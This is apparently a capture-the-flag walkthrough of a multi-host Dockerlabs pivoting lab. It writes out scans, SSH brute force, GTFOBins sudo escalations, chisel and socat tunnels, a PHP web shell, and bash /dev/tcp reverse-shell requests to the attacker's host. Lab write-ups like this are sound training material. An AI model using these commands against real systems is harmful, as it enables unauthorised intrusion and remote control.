---
date: 2024-09-22
categories: [Linux, Hard]
---

![image](https://github.com/user-attachments/assets/1ad41755-686c-411e-bbe8-b1e2af1e8161)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [El pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)         | [Dockerlabs](https://dockerlabs.es/)     | Hard           | Linux   |

---









- 10.10.10.2 (Victim 1)
    - We start with a scan of the open ports
        
        ```bash
        nmap -p- -vvv -sS --min-rate 5000 -Pn 10.10.10.2 -oG scan
        ```
        
        ![image 1](https://github.com/user-attachments/assets/1faca322-47d1-4900-acf3-fe6f48c27228)

        
    
    - Scanning open ports
        
        ```bash
        nmap -p22,80 -sCV 10.10.10.2 -oN ports
        ```
        
        ![image 2](https://github.com/user-attachments/assets/51d41b75-9f66-4a9e-83e1-3b86574a26b3)

        
    
    - We enter the website
        
        ![image 3](https://github.com/user-attachments/assets/329bc657-2f0e-4238-98b0-cafbf5ea43e5)

        
    
    - We check the technologies being used by the web application
        
        ```bash
        whatweb 10.10.10.2
        ```
        
        ![image 4](https://github.com/user-attachments/assets/7f3b1eea-c04c-481a-8cb9-00393f1c6c95)

        
    
    - We perform fuzzing to try to find directories
        
        ```bash
        gobuster dir -u http://10.10.10.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
        ```
        
        ![image 5](https://github.com/user-attachments/assets/ef0abb8b-d98d-4050-835a-0be463e09ff1)

        
    
    - We access the website `http://10.10.10.2/shop/`
        
        ![image 6](https://github.com/user-attachments/assets/8db035ea-a017-48f2-bf94-629d3264f881)

        
    
    - It seems that the web page has a parameter with which we can try to load a local file (`LFI`)
        
        ![image 7](https://github.com/user-attachments/assets/399e9a84-712b-476a-bee0-cdcf316de4bb)

        
    
    - With the absolute path it does not load anything. When trying with relative paths we managed to load files
        
        ![image 8](https://github.com/user-attachments/assets/d4f80ec6-3bce-4a29-be78-66c7e6f1f62b)

        
    
    - We discovered two users, `seller` and `manchi`. We make a brute force attack to try to connect via ssh with one of these users
    - With the user `seller` we could not get his password but with `manchi` we could
        
        ```bash
        hydra -l manchi -P /usr/share/wordlist/rockyou.txt ssh://10.10.10.2
        ```
        
        ![image 9](https://github.com/user-attachments/assets/82578be0-209c-400d-a246-10e009c9934e)

        
    
    - we connected via ssh and after searching for a while for ways to escalate our privileges we found nothing. We tried to brute force with the user `seller`
        [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce)
        
        ```bash
        ./Linux-Su-Force.sh seller rockyou.txt
        ```
        
        ![image 10](https://github.com/user-attachments/assets/a7b38ed7-21d9-495f-a4f8-d19d3195cda0)

        
    
    - We connect as seller and list the commands that we can execute as sudo without providing a password
        
        ```bash
        sudo -l
        ```
        
        ![image 11](https://github.com/user-attachments/assets/83e8b1fa-5ce5-4c2a-b31f-f202c7935a3b)

        
    
    - We search in gtfobins for ways to escalate privileges with sudo php and become root
        [GTFOBins](https://gtfobins.github.io/)
        
        ```bash
        CMD="/bin/sh"
        sudo php -r "system('$CMD');"
        ```
        
        ![image 12](https://github.com/user-attachments/assets/bf429fe7-99d3-43c6-9be9-efd10b2b0b1d)

        
    
    - We find out which ips this computer has 'hostname -I'. We apply a reconnaissance to see what other hosts are on network 20.20.20.0/24
        
        ```bash
        #!/bin/bash
        
        for i in $(seq 1 254); do
        	for port in 21 22 80 443 445 8080; do
        		timeout 1 bash -c "echo '' > /dev/tcp/20.20.20.$i/$port" &>/dev/null && echo "[+] Host 20.20.20.$i - PORT $port - OPEN" &
        	done
        done; wait
        
        ```
        
        ![image 13](https://github.com/user-attachments/assets/b2fcf310-bd97-4cdb-951d-e5139c9d6b91)

        
    
    - We create a tunnel between the two machines using `chisel`
        
        ```bash
        #Execute this from your machine
        ./chisel server --reverse -p 1234
        
        #Execute this from the 10.10.10.2 machine
        ./chisel client 10.10.10.1:1234 R:1080:socks
        ```
        
        ![image 14](https://github.com/user-attachments/assets/c20e08ab-22f6-4cc7-8621-89bb6a1bcac7)

        
        ![image 15](https://github.com/user-attachments/assets/3a151405-6b47-4b4d-98c8-914a3b4c9fde)

        
        - Add in `/etc/proxychains4.conf` the following line
            
            ```bash
            socks5 127.0.0.1 1080
            ```
            
    
- 20.20.20.3 (Victim 2)
    - We scanned the 5000 most common ports.
        
        ```bash
        proxychains4 nmap -sT -Pn --top-ports 5000 -open --min-rate 5000 -vvv -n 20.20.20.3 2>/dev/null
        ```
        
        ![image 16](https://github.com/user-attachments/assets/c96e3b30-cc97-4370-ba65-b720a317c88d)

        
    
    - As we see that you have a web service on port 80, we perform an enumeration and find a `maintenance.html` file.
        
        ```bash
        gobuster dir -u http://20.20.20.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 --proxy socks5://127.0.0.1:1080 -x .php,.txt,.html,.py
        ```
        
        ![image 17](https://github.com/user-attachments/assets/5a9e76e2-b058-4e51-a3a6-838dd205114a)

        
    
    - We access the page defining a proxy and see a potential user
        
        ![image 18](https://github.com/user-attachments/assets/3cf05fad-0f73-4407-a772-f07e08ab87e9)

        
        ![image 19](https://github.com/user-attachments/assets/08fcd5be-e142-4c98-a45c-89af67ede25f)

        
    
    - We connect via ftp with user anonymous without providing a password, find a kdbx file and download it
        
        ![image 20](https://github.com/user-attachments/assets/69769ef6-ba20-4d7a-ad45-564a314db6d9)

        
    
    - I try to get the hash with `keepass2john` to crack it but I can't
        
        ![image 21](https://github.com/user-attachments/assets/20960fdb-aa10-4ded-a77f-438aa70311f5)

        
    - I see a port `3000` open, I connect via web and find `Grafana` exposed with an outdated version.
        
        ![image 22](https://github.com/user-attachments/assets/3b072167-343b-46c5-a9aa-821e66b14198)

        
    
    - After searching in searchsploit I find a script that allows to read internal files of the machine (`LFI`). I display the content with the path indicated by the web server on port `80` (`/tmp/pass.txt`).
        
        ![image 23](https://github.com/user-attachments/assets/2cbbd86a-7ac9-4fdf-b3ec-ab541ba22b0d)

        
        ![image 24](https://github.com/user-attachments/assets/eef6d814-d359-442f-b41e-a19be10e7b1e)

        
        ![image 25](https://github.com/user-attachments/assets/25e75a70-4a9c-46c1-8854-b6e55d42dc5a)

        
    
    - We use the password found to view the contents of the .kdbx file. We see the password of the user `freddy`
        
        ![image 26](https://github.com/user-attachments/assets/3df11fc3-97ac-43f5-8faf-e8aeb8208a07)

        
    
    - We connect as freddy and list the commands that we can execute as sudo without providing a password
        
        ![image 27](https://github.com/user-attachments/assets/9073d341-924b-4bd6-b054-e7f060a5687b)

        
        ![image 28](https://github.com/user-attachments/assets/c5008308-af1f-454e-899a-886953945eb3)

        
    
    - We see that we can execute a python file without providing a password. We have permissions to modify the file, so we modify it to spawn a shell as root.
        
        ```python
        import os
        os.system("/bin/bash")
        ```
        
        ![image 29](https://github.com/user-attachments/assets/c4b6d6c7-7124-4e52-8b4a-1e2b11041c88)

        
        ![image 30](https://github.com/user-attachments/assets/0f6e0b12-ccb9-47a2-93ec-ae66f12c2287)

        
    
    - We apply a reconnaissance to see what other hosts are on network 30.30.30.0/24
        
        ```bash
        #!/bin/bash
        
        for i in $(seq 1 254); do
        	for port in 21 22 80 443 445 8080; do
        		timeout 1 bash -c "echo '' > /dev/tcp/30.30.30.$i/$port" &>/dev/null && echo "[+] Host 30.30.30.$i - PORT $port - OPEN" &
        	done
        done; wait
        
        ```
        
        ![image 31](https://github.com/user-attachments/assets/9bf39647-1413-4d5b-9e19-72f6e0e796b7)

        
        ![image 32](https://github.com/user-attachments/assets/9fbe5340-3d36-4c35-8a50-914adfae9229)

        
    
    - We create a tunnel between the three machines using `chisel`and `socat`
        
        ```python
        #Execute this from the 20.20.20.3 machine
        ./chisel client 20.20.20.2:4237 R:8888:socks
        
        #Execute this from the 10.10.10.2 machine
        ./socat TCP-LISTEN:4237,fork TCP:10.10.10.1:1234
        ```
        
        ![image 33](https://github.com/user-attachments/assets/26b9161d-7286-4135-ac52-2aaf7595b2a1)

        
        ![image 34](https://github.com/user-attachments/assets/bba19f90-0ab9-4bfc-9b9b-b5b22d906b8f)

        
        - Add in `/etc/proxychains4.conf` the following line
            
            ```bash
            socks5 127.0.0.1 8888
            ```
            
- 30.30.30.3 (Victim 3)
    - We scanned all the ports.
        
        ```bash
        seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 30.30.30.3 2>&1 | grep "tcp open"
        ```
        
        ![image 35](https://github.com/user-attachments/assets/2595fc98-2fd3-4ea6-b006-7bb44fdd02ac)

        
    
    - As we see that you have a web service on port `80`, we perform an enumeration and find a `secret.php` file.
        
        ```bash
        proxychains4 gobuster dir -u http://30.30.30.3 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:8888 -x .php,.txt,.html,.bak
        ```
        
        ![image 36](https://github.com/user-attachments/assets/493f7e2a-230c-4af4-b000-6f40dbff87b3)

        
    
    - We access the page defining a proxy and see a potential user
        
        ![image 37](https://github.com/user-attachments/assets/642cc93e-f138-4ebb-905e-5222f6480aac)

        
    
    - We make a brute force attack to try to connect via ssh
        
        ```bash
        proxychains hydra -l mario -P /usr/share/wordlist/rockyou.txt ssh://30.30.30.3 2>/dev/null
        ```
        
        ![image 38](https://github.com/user-attachments/assets/df549df8-dcb0-45ba-9fea-f945d655c41f)

        
    
    - We connect via ssh and see what commands you can execute as sudo without providing a password
        
        ![image 39](https://github.com/user-attachments/assets/1078956d-825b-41f4-9bad-85ed7123acc5)

        
    
    - We search in gtfobins for ways to escalate privileges with sudo vim and become root
        
        ```bash
        sudo vim -c ':!/bin/sh'
        ```
        
        ![image 40](https://github.com/user-attachments/assets/b01cde3b-9b9c-4294-8565-488a304f4654)

        
    
    - We create a tunnel between the three machines using `chisel` and `socat`
        
        ```bash
        #Execute this from the 30.30.30.3 machine
        ./chisel client 30.30.30.2:9998 R:9999:socks
        
        #Execute this from the 20.20.20.2 machine
        ./socat TCP-LISTEN:9998,fork TCP:20.20.20.2:9997
        
        #Execute this from the 10.10.10.2 machine
        ./socat TCP-LISTEN:9997,fork TCP:10.10.10.1:1234
        ```
        
        ![image 41](https://github.com/user-attachments/assets/139885bd-b3f8-4f5f-98da-0d890deea35d)

        
        ![image 42](https://github.com/user-attachments/assets/9ef09f80-51fd-4569-b9a0-fd94daf4cb23)

        
        ![image 43](https://github.com/user-attachments/assets/b5e74c91-bad3-4f59-ad13-10a6d858a956)

        
        - Add in `/etc/proxychains4.conf` the following line
            
            ```bash
            socks5 127.0.0.1 9999
            ```
            
    
- 40.40.40.3 (Victim 4)
    - We scanned all the ports.
        
        ```bash
        seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 40.40.40.3 2>&1 | grep "tcp open"
        ```
        
        ![image 44](https://github.com/user-attachments/assets/8649552f-cc9d-4c52-9bb2-b1c23b670785)

        
    - We try to upload a php file with which we can execute commands (`RCE`)
        
        ![image 45](https://github.com/user-attachments/assets/9b18c343-8a8b-46b7-b2d0-076eed7cf0c2)

        
        ```bash
        <?php 
        	system($_GET['cmd']);
        ?>
        ```
        
    
    - we find where the file we have just uploaded is located and see that we can execute the following commands
        
        ![image 46](https://github.com/user-attachments/assets/8b35c324-a5bf-41ff-bae0-7acd4ef18a7b)

        
    
    - We create a tunnel so that when doing a reverse shell we get to our computer.
        
        ```bash
        #Victim 1 (10.10.10.2)
        ./socat TCP-LISTEN:6662,fork TCP:10.10.10.1:6666
        
        #Victim 2 (20.20.20.3)
        ./socat TCP-LISTEN:6661,fork TCP:20.20.20.2:6662
        
        #Victim 3 (30.30.30.3)
        ./socat TCP-LISTEN:6666,fork TCP:30.30.30.2:6661
        ```
        
    
    - we make the request to create the reverse shell
        
        ![image 47](https://github.com/user-attachments/assets/5e216ed0-711b-4327-bc0d-e8e516f884e6)

        
        ```bash
        http://40.40.40.3/uploads/a.php?cmd=bash -c "bash -i >%26 /dev/tcp/40.40.40.2/6666 0>%261"
        ```
        
        ![image 48](https://github.com/user-attachments/assets/ccd70664-e063-4d49-a540-51b3ba527b4a)

        
    
    - We connect as www-data and list the commands that we can execute as sudo without providing a password
        
        ![image 49](https://github.com/user-attachments/assets/fc4696fc-a676-446f-a6c3-261b90dcde21)

        
    
    - We search in gtfobins for ways to escalate privileges with sudo env and become root
        
        ```bash
        sudo env /bin/sh
        ```
        
        ![image 50](https://github.com/user-attachments/assets/ff89d167-a4d9-4067-b9ec-96423a124191)

        
    
    - We create a tunnel between the three machines using `chisel` and `socat`
        
        ```bash
        #Execute this from the 40.40.40.3 machine
        ./chisel client 40.40.40.2:7776 R:7777:socks
        
        #Execute this from the 30.30.30.3 machine
        ./socat TCP-LISTEN:7776,fork TCP:30.30.30.2:7775
        
        #Execute this from the 20.20.20.2 machine
        ./socat TCP-LISTEN:7775,fork TCP:20.20.20.2:7774
        
        #Execute this from the 10.10.10.2 machine
        ./socat TCP-LISTEN:7774,fork TCP:10.10.10.1:1234
        ```
        
        ![image 51](https://github.com/user-attachments/assets/5803099a-54c5-45fe-9cdb-f7bb93a81743)

        
        ![image 52](https://github.com/user-attachments/assets/901eb2c2-a565-4e41-b347-7baf238c6231)

        
        ![image 53](https://github.com/user-attachments/assets/94a61d67-ba09-4a35-ad98-f6f191ab179c)

        
        ![image 54](https://github.com/user-attachments/assets/50abecd4-dab6-48ce-a994-16e6a6b1b424)

        
        ![image 55](https://github.com/user-attachments/assets/0666bba5-6d69-466c-af03-377513132658)

        
        - Add in `/etc/proxychains4.conf` the following line
            
            ```bash
            socks5 127.0.0.1 7777
            ```
            
    
- 50.50.50.3 (Victim 5)
    - We scanned all the ports.
        
        ```bash
        seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 50.50.50.3 2>&1 | grep "tcp open"
        ```
        
        ![image 56](https://github.com/user-attachments/assets/beac9bff-c9c3-4f7e-a585-6b1c5b84ecb2)

        
    - As we see that you have a web service on port 80, we perform an enumeration and find a `warning.html` file.
        
        ```bash
        gobuster dir -u http://50.50.50.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 --proxy socks5://127.0.0.1:7777 -x .php,.txt,.html,.py
        ```
        
        ![image 57](https://github.com/user-attachments/assets/f22c1fa2-850a-4006-abc4-f11496010e80)

        
    - We access the page defining a proxy and see a potential user
        
        ![image 58](https://github.com/user-attachments/assets/66ff8ae3-5d95-4114-8ee2-a0312ef3e803)

        
        ![image 59](https://github.com/user-attachments/assets/59dd89a2-14df-4f4f-8ed8-6c75ae8ab912)

        
    
    - By brute force I try to get the parameter used by the rever shell
        
        ```bash
        proxychains wfuzz -c -t 50 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt "http://50.50.50.3/shell.php?FUZZ=whoami" 
        ```
        
        ![image 60](https://github.com/user-attachments/assets/6fb2fb80-3b37-4393-af24-dc55775c2a5e)

        
    
    - We create a tunnel so that when doing a reverse shell we get to our computer.
        
        ```bash
        #Victim 1 (10.10.10.2)
        ./socat TCP-LISTEN:6662,fork TCP:10.10.10.1:6666
        
        #Victim 2 (20.20.20.3)
        ./socat TCP-LISTEN:6661,fork TCP:20.20.20.2:6662
        
        #Victim 3 (30.30.30.3)
        ./socat TCP-LISTEN:6660,fork TCP:30.30.30.2:6661
        
        #Victim 3 (40.40.40.3)
        ./socat TCP-LISTEN:6666,fork TCP:30.30.30.2:6660
        ```
        
    
    - we make the request to create the reverse shell
        
        ```bash
        http://50.50.50.3/uploads/a.php?cmd=bash -c "bash -i >%26 /dev/tcp/50.50.50.2/6666 0>%261"
        ```
        
        ![image 61](https://github.com/user-attachments/assets/5995542b-ebe3-48be-8555-4eeb29cc2064)

        
    
    - I do a search and find a hidden file that contains a password, I try it with root and I manage to escalate privileges.
        
        ![image 62](https://github.com/user-attachments/assets/69830029-02c5-44dd-b1a8-b773f2f579f7)
